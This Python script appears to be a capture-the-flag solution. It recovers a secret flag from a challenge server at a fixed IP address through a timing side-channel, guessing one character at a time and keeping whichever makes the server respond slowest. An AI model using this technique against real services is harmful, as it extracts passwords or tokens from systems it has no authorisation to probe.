import time
import socket

# Server details
HOST = '103.28.91.24'
PORT = 10021

# Known part of the flag (initially empty)
known_flag = "3108{s1mpl3_p3n"

# Target string length
target_length = 3

# Create a socket connection to the server
def send_payload(payload):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.recv(1024)
        start_time = time.time()
        s.sendall(payload.encode())
        s.recv(1024)
        end_time = time.time()
    return end_time - start_time

# Iterate over the length of the flag
for i in range(target_length):
    max_duration = 0
    best_char = ''
    
    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/`~":
        test_string = known_flag + c
        
        # Send payload and measure response time
        varsum = 0.0
        for i in range(5):
            duration = send_payload(test_string)
            varsum += duration
        
        avgtime = varsum/5.0
        # Print the response time
        print(f"Response time for '{test_string}': {avgtime:.5f} seconds")
        
        # Keep track of the character with the highest response time
        if avgtime > max_duration:
            max_duration = avgtime
            best_char = c
    
    # Add the character with the highest response time to known_flag
    known_flag += best_char
    print(f"Character added to known_flag: {best_char}, Current known_flag: {known_flag}")

print(f"Final flag (guessed): {known_flag}")
